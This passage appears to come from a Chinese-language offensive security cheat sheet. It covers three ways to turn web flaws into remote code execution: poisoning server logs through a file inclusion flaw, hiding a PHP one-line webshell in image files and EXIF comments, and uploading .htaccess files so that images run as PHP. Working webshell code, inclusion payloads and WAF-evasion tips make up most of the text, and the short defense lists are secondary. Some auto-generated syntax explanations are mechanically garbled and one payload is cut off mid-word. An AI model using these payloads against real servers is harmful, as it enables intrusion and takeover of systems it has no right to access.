**概述：** 日志投毒RCE是最可靠的LFI→RCE升级路径之一：向Web服务器日志注入PHP代码(通过请求头)，然后通过文件包含漏洞加载日志文件触发代码执行，适用于Apache/Nginx等主流Web服务器。

**漏洞原理：** 日志投毒的注入点：1)Apache access.log中的User-Agent/Referer字段 2)Nginx access.log 3)错误日志error.log(故意触发包含不存在文件的错误) 4)FTP日志(vsftpd) 5)SSH日志(/var/log/auth.log)中的用户名字段。

**利用方法：** 完整利用流程：
1. 发现文件包含漏洞
2. 确定日志文件路径
3. 注入恶意代码到日志
4. 包含日志文件
5. 执行命令获取Shell

**防御措施：** 防御措施：
1. 限制日志文件访问
2. 过滤日志中的特殊字符
3. 禁用文件包含
4. 使用open_basedir限制

---

### 图片马RCE  `rce-image`
_利用图片马实现RCE_
子类：**图片马** · tags: `rce` `image` `webshell` `upload`

**前置条件：**
- 存在文件上传
- 存在文件包含

**攻击链：**

**1. 制作图片马**
> 制作图片马
```
# Windows
copy test.jpg/b + shell.php/a shell.jpg

# Linux
cat test.jpg shell.php > shell.jpg

# 在图片末尾添加PHP代码
echo "<?php @eval($_POST[cmd]);?>" >> test.jpg
```
**语法解析：**
- `copy test.jpg/b + shell.php/a` — Windows下将图片和PHP代码二进制合并 _command_
- `cat test.jpg shell.php > shell.jpg` — Linux下拼接图片和PHP代码 _command_
- `echo "<?php ...?>" >> test.jpg` — 在图片末尾追加PHP代码 _command_

**2. 图片马内容**
> 图片马格式
```
GIF89a
<?php @eval($_POST[cmd]);?>

# 或使用Exif注释
exiftool -Comment="<?php @eval($_POST[cmd]);?>" test.jpg
```
**语法解析：**
- `GIF89a` — GIF文件头魔术字节，用于通过文件头检测 _command_
- `<?php @eval($_POST[cmd]);?>` — 一句话木马，@抑制错误信息 _value_
- `exiftool -Comment=` — 将PHP代码写入图片EXIF注释字段，更隐蔽 _command_

**3. 利用文件包含执行**
> 文件包含执行
```
# 配合文件包含漏洞
?file=upload/shell.jpg
POST: cmd=system('whoami');

# 配合phar://
?file=phar://upload/shell.jpg
```
**语法解析：**
- `system()` — 系统命令执行 _function_

**4. 配合.htaccess**
> 配合.htaccess执行
_platform: linux_
```
# 上传.htaccess
AddType application/x-httpd-php .jpg

# 直接访问图片执行
http://target/upload/shell.jpg
```
**语法解析：**
- `AddType application/x-httpd-php .jpg` — Apache配置将.jpg按PHP解析 _command_
- `http://target/upload/shell.jpg` — 直接访问图片触发PHP执行，无需文件包含 _value_

**WAF/EDR 绕过变体：**

**文件头伪装**
> 文件头伪装
```
使用真实图片文件头
确保图片可正常预览
```
**语法解析：**
- `真实图片文件头` — 使用完整的图片文件头（如JPEG的FF D8 FF E0） _command_
- `可正常预览` — 确保图片能正常打开显示，避免文件完整性检查失败 _parameter_


**概述：** 图片RCE利用图片处理库(ImageMagick/GD/Pillow)的漏洞或特性在服务器处理上传图片时执行代码。ImageMagick的"ImageTragick"(CVE-2016-3714)是最著名的案例。

**漏洞原理：** ImageMagick利用delegate(委托处理器)执行外部命令：MVG格式中的push graphic-context指令、SVG中的xlink:href外部引用、ephemeral协议删除文件、MSL格式写入文件等。GD库的特定版本也存在堆溢出等漏洞。

**利用方法：** 完整利用流程：
1. 制作图片马
2. 上传图片马
3. 找到文件包含点
4. 包含图片马执行代码
5. 获取Shell

**防御措施：** 防御措施：
1. 检查文件完整内容
2. 重绘图片去除恶意代码
3. 禁用文件包含
4. 存储到非Web目录

---

### .htaccess利用  `rce-htaccess`
_利用.htaccess文件实现RCE_
子类：**.htaccess** · tags: `rce` `htaccess` `apache` `upload`

**前置条件：**
- Apache服务器
- 可上传.htaccess

**攻击链：**

**1. 解析其他扩展名**
> 修改文件类型解析
_platform: linux_
```
# 让.jpg文件作为PHP执行
AddType application/x-httpd-php .jpg
AddHandler php-script .jpg

# 让.txt文件作为PHP执行
AddType application/x-httpd-php .txt
```
**语法解析：**
- `AddType` — 设置MIME类型 _value_
- `AddHandler` — 设置处理程序 _value_

**2. 自动包含**
> 自动包含文件
_platform: linux_
```
# 自动在每个文件前包含
php_value auto_prepend_file /var/www/html/shell.php

# 自动在每个文件后包含
php_value auto_append_file /var/www/html/shell.php
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 自动在每个文件前包含
php_value auto_prepend_file /var/www/html/shell.php

# 自动在每个文件后包含
php_value auto_append_file /var/www/html/shell.php` — 参数与载荷内容 _value_

**3. 伪静态RCE**
> 伪静态配置
_platform: linux_
```
# 利用mod_rewrite
RewriteEngine on
RewriteRule ^(.*)$ $1 [L]

# 更危险的配置
SetHandler application/x-httpd-php
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 利用mod_rewrite
RewriteEngine on
RewriteRule ^(.*)$ $1 [L]

# 更危险的配置
SetHandler application/x-httpd-php` — 参数与载荷内容 _value_

**4. 错误页面包含**
> 错误页面利用
_platform: linux_
```
# 自定义错误页面
ErrorDocument 404 /shell.php
ErrorDocument 500 /shell.php
```
**语法解析：**
- `#` — 命令/载荷起始 _command_
- ` 自定义错误页面
ErrorDocument 404 /shell.php
ErrorDocument 500 /shell.php` — 参数与载荷内容 _value_

**5. 文件包含绕过**
> PHP配置修改
_platform: linux_
```
# 设置include路径
php_value include_path "/var/www/html/uploads"

# 禁用安全限制
php_flag safe_mode off
php_flag display_errors on
```
**语法解析：**
- `# 设置include路径
php_value include_path "/var/www/html/uploads"

# 禁用安全限制
php_f` — 攻击载荷 _value_

**WAF/EDR 绕过变体：**

**换行绕过**
> 换行绕过
_platform: linux_
```
使用换行符分隔配置
绕过单行检测
```
**语法解析：**
- `使用换行符分隔配置
绕过单行检测` — 攻击载荷 _value_


**概述：** .htaccess文件RCE通过上传或修改Apache的.htaccess配置文件，改变服务器对特定文件类型的处理方式(如将.jpg文件作为PHP解析)，或直接通过php_value注入PHP代码。

**漏洞原理：** .htaccess RCE方式：1)AddType application/x-httpd-php .jpg使图片文件被当作PHP解析 2)php_value auto_prepend_file配合php://input注入代码 3)SetHandler将目录所有文件作为PHP处理 4)php_flag engine配合.user.ini。

**利用方法：** 完整利用流程：
1. 上传恶意.htaccess
2. 配置文件类型解析
3. 上传伪装的WebShell
4. 访问执行
5. 获取服务器权限

**防御措施：** 防御措施：
1. 禁止上传.htaccess
2. 禁用AllowOverride
3. 白名单验证文件名
4. 重命名上传文件

---
